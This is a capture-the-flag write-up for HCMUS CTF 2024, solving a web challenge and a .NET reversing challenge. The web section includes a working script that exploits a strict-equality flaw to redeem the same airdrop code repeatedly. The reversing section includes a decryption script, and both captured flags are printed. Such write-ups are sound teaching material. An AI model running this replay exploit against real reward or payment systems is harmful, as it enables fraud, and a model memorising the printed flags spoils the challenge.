# HCMUS CTF 2024 - Write-ups

## Web/BP Airdrop

We are given the source code of a website, so we will explore it.

First, we need to run `npm i` to install dependencies. Then, we host the server by running `npm start`. Now, we can access the site at `localhost:8888`. The home page will look like this:

![home-page](https://github.com/user-attachments/assets/978fa650-a08b-4596-b1a9-ac0ab28615f8)

We just need to use any username to log in. After that, we will see an **Airdrop Code** and a **Value**:

![airdrop-code](https://github.com/user-attachments/assets/e1563042-9289-40bd-83f5-06c86088ce15)

Then, we can go to **Redeem** page to enter the code and claim a reward. After that, we will see our gold increase:

![redeem-page](https://github.com/user-attachments/assets/f4357b04-c90c-45d7-9baf-61426498c1fb)

Now, go to the **Shop** page to buy something. We can see that it offers the flag for 100,000 gold:

![shop-page](https://github.com/user-attachments/assets/fb754543-afce-402c-879e-72822321f06d)

But we don't have enough gold right now. Additionally, if we go back to the **Redeem** page to enter the code again, it will fail:

![redeem-failed](https://github.com/user-attachments/assets/026683f7-7934-4892-baf3-8501408b878d)

So let's explore the source code to find the solution. In `/src/index.js`, we can notice at the `/redeeem` endpoint:

```javascript
app.post('/redeem', authMiddleware, function (req, res) {
    const { airdropCode } = req.body;
    if (airdropCode === code.code ) {
        if (!logs.hasOwnProperty(req.username)) {
            logs[req.username] = [];
        }
        for (let log of logs[req.username]) {
            if (log === code) {
                res.json({ success: false });
                return;
            }
        }
        logs[req.username].push(code);
        console.log(logs);
        req.balance += code.value;
        let data = { username: req.username, balance: req.balance, avatar: req.avatar};
        fs.writeFileSync(__dirname + '/../data/account/' + req.username + '.json', JSON.stringify(data, null, 4));
        fs.writeFileSync(__dirname + '/../data/logs.json', JSON.stringify(logs, null, 4));

        res.json({ success: true, newbalance: req.balance });
        return;
    }
    res.json({ success: false });
});
```

You can see that it first check whether the code you submitted is valid, then looping through the code objects stored in your username to check if the code was used. However, you will notice that they use `===` operator to compare the current **code** object with the one in **logs**. So, this comparison still return `false` if the **code** object references to a different object in memory although the contents are the same. Therefore, we will find when the **code** object will be reassigned. And we found this:

```javascript
app.get('/api/info', (req, res) => {
    code = JSON.parse(fs.readFileSync(__dirname + '/../data/airdrop.json'));
    res.json({ message: 'Welcome to the BP Airdrop API! Here is the current airdrop code and value.', code: code.code, value: code.value });
});
```

So now, here is the stratecy that we will use to increase the **golds**:

1. Send a request to `/api/info` to reassign the **code** object.
2. Send a request to `/redeem` with the current **code** and the cookie that stores your **username**.
3. Repeat until your **balance** reaches 100000.

Here is the script:

```javascript
const axios = require('axios');
const cookie = 'username=your_cookie'; // Replace with your actual cookie

async function getInfo() {
    const response = await axios.get('http://chall.blackpinker.com:33674/api/info', {
        headers: { Cookie: cookie }
    });
    return response.data.code;
}

async function redeem(code) {
    const response = await axios.post('http://chall.blackpinker.com:33674/redeem', { airdropCode: code }, {
        headers: { Cookie: cookie }
    });
    return response.data;
}

async function getBalance() {
    const response = await axios.get('http://chall.blackpinker.com:33674/shop', {
        headers: { Cookie: cookie }
    });
    const balanceMatch = response.data.match(/balance: (\d+)/);
    return balanceMatch ? parseInt(balanceMatch[1], 10) : 0;
}

(async () => {
    let balance = await getBalance();
    while (balance < 100000) {
        const code = await getInfo();
        const result = await redeem(code);
        if (result.success) {
            balance = result.newbalance;
            console.log(`New balance: ${balance}`);
        } else {
            console.log('Redeem failed');
        }
    }
    console.log('Reached 100000 coins!');
})();
```

After that, just go to **Shop** and buy the flag, here is my flag: 

`HCMUS-CTF{5trIct_eqU@l!Ty_!SN't_!T_101193d7181cc883}`

## Reversing/My Vault

We are given `myvault.exe` and `vault`.

After running `strings myvault.exe`, we can know that it is a **.NET application** through this line of the output `.NET Framework 4.7.2`. So we will open `myvault.exe` in **dnSpy** to decompile it.

Now we take a look at the method `Main` of `myvault` class:

```csharp
private static void Main(string[] args) 
{
    if (A.A() || a.A()) 
    {
        Console.WriteLine(9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.A());
        Environment.Exit(1);
    }
    B.A();
    C.A();
    byte[] key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.a()));
    byte[] iv = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.B()));
    Array.Resize<byte>(ref key, 32);
    Array.Resize<byte>(ref iv, 16);
    byte[] bytes = Encoding.UTF8.GetBytes(9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.b());
    Array.Resize<byte>(ref bytes, 24);
    byte[] bytes2 = Encoding.UTF8.GetBytes(9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.C());
    Array.Resize<byte>(ref bytes2, 8);
    Console.Write(9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.c());
    string s = Console.ReadLine();
    byte[] bytes3 = myvault.EncryptWithTripleDES(myvault.EncryptWithAES(Encoding.UTF8.GetBytes(s), key, iv), bytes, bytes2);
    File.WriteAllBytes(9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.D(), bytes3);
    Console.WriteLine(9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.d());
    Console.ReadKey();
}
```

It uses **AES** and **TripleDES** for encryption. Let's break down the code to understand how the keys and IVs are generated:

1. AES Key and IV:
    - The AES key is derived from the SHA256 hash of `9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.a()`, resized to 32 bytes.
    - The AES IV is derived from the SHA256 hash of `9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.B()`, resized to 16 bytes.

2. TripleDES Key and IV:
    - The TripleDES key is derived from the UTF-8 bytes of `9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.b()`, resized to 24 bytes.
    - The TripleDES IV is derived from the UTF-8 bytes of `9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.C()`, resized to 8 bytes.

Now, navigate to `<PrivateImplementationDetails>{GUID}` and look at `9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324` class, we will see the string values returned by the methods `a()`, `B()`, `b()`, and `C()`:

```csharp
public static string a()
{
    return 9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.5[1] ?? 9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.6(1, 27, 43);
}

public static string B()
{
    return 9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.5[2] ?? 9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.6(2, 70, 63);
}

public static string b()
{
    return 9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.5[3] ?? 9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.6(3, 133, 24);
}

public static string C()
{
    return 9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.5[4] ?? 9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.6(4, 157, 23);
}
```

Next, we need to find the contents of the array `5` and the method `6`.

```csharp
internal static string[] 5 = new string[44];

private static string 6(int A_0, int A_1, int A_2)
{
    string @string = Encoding.UTF8.GetString(9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.4, A_1, A_2);
    9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.5[A_0] = @string;
    return @string;
}
```

Then, we need to access the byte array `9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.4`.

```csharp
9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.4 = new byte[]
{
    238, 238, 234, 252, 233, 232, 233, byte.MaxValue, 130, 229, 239, 244, 232, 227, 138, 133, byte.MaxValue, 227, 241, 237, 158, 241, 243, 234, 147, 146, 145, 217, 194, 195, 196, 198, 176, 164, 167, 254, 249, 248, 162, 235, 227, 224, 229, 227, 233, 232, 239, 171, 249, 244, 245, 182, 246, 252, 241, 232, 225, 189, 243, 254, 251, 231, 231, 240, 137, 197, 139, 133, 155, 141, 132, 153, 150, 147, 147, 219, 201, 200, 147, 146, 141, 213, 129, 150, 139, 139, 137, 159, 151, 221, 147, 158, 155, 216, 131, 148, 190, 168, 160, 246, 184, 242, 168, 156, 181, 247, 183, 248, 145, 160, 156, 166, 139, 253, 168, 169, 227, 166, 187, 136, 152, 176, 189, 189, 188, 182, 173, 151, 83, 73, 26, 81, 93, 71, 79, 64, 87, 80, 13, 66, 82, 65, 9, 75, 85, 22, 86, 86, 74, 18, 82, 82, 70, 30, 73, 94, 67, 95, 87, 88, 127, 120, 107, 125, 104, 34, 110, 97, 54, 96, 107, 113, 55, 105, 111, 54, 104, 58, 57, 56, 91, 113, 104, 120, 96, 51, 100, 121, 115, 55, 103, 97, 24, 2, 6, 14, 78, 27, 3, 77, 7, 13, 3, 19, 31, 23,  16, 95, 90, 13, 25, 12, 18, 11, 57, 19, 17, 1, 9, 1, 2, 30, 27, 27,  106, 56, 61, 42, 45, 42, 63, 62, 36, 54, 44, 111, 102, 3, 37, 49, 59,  123, 47, 43, 55, 43, 40, 56, 60, 115, 36, 62, 118, 33, 53, 32, 198, 223, 199, 197, 194, 214, 200, 207, 197, 202, 196, 192, 207, 195, 197, 147, 142, 210, 220, 216, 217, 214, 216, 220, 213, 133, 132, 216, 210, 214, 195, 220, 238, 234, byte.MaxValue, 191, 186, 230, 232, 236, 243, 234, 228, 224, 247, 177, 176, 236, 254, 250, 237, 240, 250, 254, 233, 171, 166, 224, 243, 232, 250, 251, 245, 230, 137, 146, 132, 133, 143, 176, 148, 219, 214, 144, 131, 152, 138, 139, 133, 186, 130, 195, 206, 137, 140, 144, 136, 152, 145, 135, 153, 158, 152, 168, 157, 145, 178, 253, 252, 173, 172, 168, 180, 254, 240, 167, 162, 166, 177, 174, 170, 161, 184, 188, 188, 183, 141, 175, 165, 175, 183, 160, 184, 176, 181, 188, 177, 167, 99, 70, 88, 70, 92, 91, 126, 104, 97, 106, 109, 108, 115, 105, 109, 113, 99, 127, 125, 123, 107, 120, 123, 120, 96, 126, 85, 86, 87, 115, 65, 88, 122, 110, 122, 65, 90, 91, 92, 73, 103, 97, 117, 102, 97, 98, 118, 80, 83, 83, 76, 77, 78, 91, 121, 127, 103, 116, 119, 116, 100, 68, 98, 118, 34, 63, 60, 57, 78, 43, 9, 15, 23, 4, 7, 4, 20, 47, 48, 49, 42, 91, 60, 28, 28, 10, 27, 26, 23, 1, 80, 89, 69, 69, 84, 23, 35, 63, 97, 1, 26, 27, 28, 109, 6, 38, 34, 52, 33, 32, 33, 55, 122, 115, 110, 109, 126, 61, 53, 41, 123, 28, 28, 29, 15, 19, 22, 18, 206, 194, 219, 200, 221, 220, 201, 192, 192, 207, 217, 229, 195, 197, 209, 194, 225, 248, 232, 236, 247, 210, 209, 200, 220, 218, 196, 200, 225, 222, 218, 241, 232, 236, 193, 228, 254, 224, 254, 249, 162, 241, 229, 226, 233, 233, 247, 241, 232, 238, 251, 237, 241, 237, 209, 248, 245, 242, 212, 228, 251, 231, 241, 231, 202, 218, 198, 217, 206, 141, 149, 205, 161, 140, 132, 132, 165, 149, 133, 134, 145, 158, 138, 217, 209, 223, 175, 147, 182
};
for (int i = 0; i < 9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.4.Length; i++)
{
    9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.4[i] = (byte)((int)9B0E58B1-AB5C-45D3-8DA4-70AEB30AB324.4[i] ^ i ^ 170);
}
```

To successfully decrypt the `vault` file, we'll need to accurately reconstruct the byte array 4 from the C# code, apply the necessary XOR transformations, extract the required strings using the provided methods, and then use these strings to derive the AES and TripleDES keys and IVs. Below is a comprehensive guide and the updated Python script to achieve this:

```python
from Crypto.Cipher import AES, DES3
from hashlib import sha256

def unpad(data):
    padding_len = data[-1]
    return data[:-padding_len]

def decrypt_with_aes(encrypted_data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(encrypted_data)
    return unpad(decrypted_data)

def decrypt_with_3des(encrypted_data, key, iv):
    cipher = DES3.new(key, DES3.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(encrypted_data)
    return unpad(decrypted_data)

# Initialize byte array 4 with the provided byte values
array_4 = [
    238, 238, 234, 252, 233, 232, 233, 255, 130, 229, 239, 244, 232, 227,
    138, 133, 255, 227, 241, 237, 158, 241, 243, 234, 147, 146, 145, 217,
    194, 195, 196, 198, 176, 164, 167, 254, 249, 248, 162, 235, 227, 224,
    229, 227, 233, 232, 239, 171, 249, 244, 245, 182, 246, 252, 241, 232,
    225, 189, 243, 254, 251, 231, 231, 240, 137, 197, 139, 133, 155, 141,
    132, 153, 150, 147, 147, 219, 201, 200, 147, 146, 141, 213, 129, 150,
    139, 139, 137, 159, 151, 221, 147, 158, 155, 216, 131, 148, 190, 168,
    160, 246, 184, 242, 168, 156, 181, 247, 183, 248, 145, 160, 156, 166,
    139, 253, 168, 169, 227, 166, 187, 136, 152, 176, 189, 189, 188, 182,
    173, 151, 83, 73, 26, 81, 93, 71, 79, 64, 87, 80, 13, 66, 82, 65, 9,
    75, 85, 22, 86, 86, 74, 18, 82, 82, 70, 30, 73, 94, 67, 95, 87, 88,
    127, 120, 107, 125, 104, 34, 110, 97, 54, 96, 107, 113, 55, 105, 111,
    54, 104, 58, 57, 56, 91, 113, 104, 120, 96, 51, 100, 121, 115, 55,
    103, 97, 24, 2, 6, 14, 78, 27, 3, 77, 7, 13, 3, 19, 31, 23, 16, 95,
    90, 13, 25, 12, 18, 11, 57, 19, 17, 1, 9, 1, 2, 30, 27, 27, 106, 56,
    61, 42, 45, 42, 63, 62, 36, 54, 44, 111, 102, 3, 37, 49, 59, 123, 47,
    43, 55, 43, 40, 56, 60, 115, 36, 62, 118, 33, 53, 32, 198, 223, 199,
    197, 194, 214, 200, 207, 197, 202, 196, 192, 207, 195, 197, 147, 142,
    210, 220, 216, 217, 214, 216, 220, 213, 133, 132, 216, 210, 214, 195,
    220, 238, 234, 255, 191, 186, 230, 232, 236, 243, 234, 228, 224, 247,
    177, 176, 236, 254, 250, 237, 240, 250, 254, 233, 171, 166, 224, 243,
    232, 250, 251, 245, 230, 137, 146, 132, 133, 143, 176, 148, 219, 214,
    144, 131, 152, 138, 139, 133, 186, 130, 195, 206, 137, 140, 144, 136,
    152, 145, 135, 153, 158, 152, 168, 157, 145, 178, 253, 252, 173, 172,
    168, 180, 254, 240, 167, 162, 166, 177, 174, 170, 161, 184, 188, 188,
    183, 141, 175, 165, 175, 183, 160, 184, 176, 181, 188, 177, 167, 99,
    70, 88, 70, 92, 91, 126, 104, 97, 106, 109, 108, 115, 105, 109, 113,
    99, 127, 125, 123, 107, 120, 123, 120, 96, 126, 85, 86, 87, 115, 65,
    88, 122, 110, 122, 65, 90, 91, 92, 73, 103, 97, 117, 102, 97, 98, 118,
    80, 83, 83, 76, 77, 78, 91, 121, 127, 103, 116, 119, 116, 100, 68,
    98, 118, 34, 63, 60, 57, 78, 43, 9, 15, 23, 4, 7, 4, 20, 47, 48, 49,
    42, 91, 60, 28, 28, 10, 27, 26, 23, 1, 80, 89, 69, 69, 84, 23, 35,
    63, 97, 1, 26, 27, 28, 109, 6, 38, 34, 52, 33, 32, 33, 55, 122, 115,
    110, 109, 126, 61, 53, 41, 123, 28, 28, 29, 15, 19, 22, 18, 206, 194,
    219, 200, 221, 220, 201, 192, 192, 207, 217, 229, 195, 197, 209, 194,
    225, 248, 232, 236, 247, 210, 209, 200, 220, 218, 196, 200, 225, 222,
    218, 241, 232, 236, 193, 228, 254, 224, 254, 249, 162, 241, 229, 226,
    233, 233, 247, 241, 232, 238, 251, 237, 241, 237, 209, 248, 245, 242,
    212, 228, 251, 231, 241, 231, 202, 218, 198, 217, 206, 141, 149, 205,
    161, 140, 132, 132, 165, 149, 133, 134, 145, 158, 138, 217, 209, 223,
    175, 147, 182
]

# Apply the XOR transformation as done in the C# constructor
for i in range(len(array_4)):
    array_4[i] ^= i ^ 170

# Initialize array_5 with 44 elements set to None
array_5 = [None] * 44

def method_6(A_0, A_1, A_2):
    global array_5
    # Ensure A_1 and A_2 are within bounds
    if A_1 < 0 or A_1 + A_2 > len(array_4):
        print(f"Error: Invalid parameters for method_6: A_0={A_0}, A_1={A_1}, A_2={A_2}")
        return ""
    # Extract the substring from array_4
    substring_bytes = array_4[A_1:A_1 + A_2]
    try:
        substring = bytes(substring_bytes).decode('utf-8')
    except UnicodeDecodeError:
        # Handle decoding errors if any
        substring = bytes(substring_bytes).decode('utf-8', errors='replace')
    array_5[A_0] = substring
    return substring

def a():
    return array_5[1] if array_5[1] is not None else method_6(1, 27, 43)

def B():
    return array_5[2] if array_5[2] is not None else method_6(2, 70, 63)

def b():
    return array_5[3] if array_5[3] is not None else method_6(3, 133, 24)

def C():
    return array_5[4] if array_5[4] is not None else method_6(4, 157, 23)

def main():
    try:
        # Read the encrypted data from the vault file
        with open('vault', 'rb') as f:
            encrypted_data = f.read()

        # Retrieve actual strings by calling the methods
        actual_a_string = a()      # From a()
        actual_B_string = B()      # From B()
        actual_b_string = b()      # From b()
        actual_C_string = C()      # From C()

        # Debug: Print the extracted strings
        print(f"actual_a_string: {actual_a_string}")
        print(f"actual_B_string: {actual_B_string}")
        print(f"actual_b_string: {actual_b_string}")
        print(f"actual_C_string: {actual_C_string}")

        # Derive the AES key and IV
        aes_key = sha256(actual_a_string.encode()).digest()[:32]  # 32 bytes for AES-256
        aes_iv = sha256(actual_B_string.encode()).digest()[:16]   # 16 bytes IV

        # Derive the TripleDES key and IV
        des3_key = actual_b_string.encode()[:24]  # 24 bytes for TripleDES key
        des3_iv = actual_C_string.encode()[:8]    # 8 bytes IV

        # Debug: Print the derived keys and IVs
        print(f"aes_key (hex): {aes_key.hex()}")
        print(f"aes_iv (hex): {aes_iv.hex()}")
        print(f"des3_key (hex): {des3_key.hex()}")
        print(f"des3_iv (hex): {des3_iv.hex()}")

        # Decrypt using TripleDES first
        decrypted_data_3des = decrypt_with_3des(encrypted_data, des3_key, des3_iv)
        print("After TripleDES Decryption:", decrypted_data_3des)

        # Then decrypt using AES
        decrypted_data_aes = decrypt_with_aes(decrypted_data_3des, aes_key, aes_iv)
        print("After AES Decryption:", decrypted_data_aes)

        # Decode and print the decrypted data
        decrypted_text = decrypted_data_aes.decode('utf-8')
        print("Decrypted data:", decrypted_text)

    except ValueError as ve:
        print(f"Decryption failed: {ve}")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
```

After running this script, the flag is:

`HCMUS-CTF{S3cR3t_v7u1t_k3eP_s3c4t_1h1n9}`
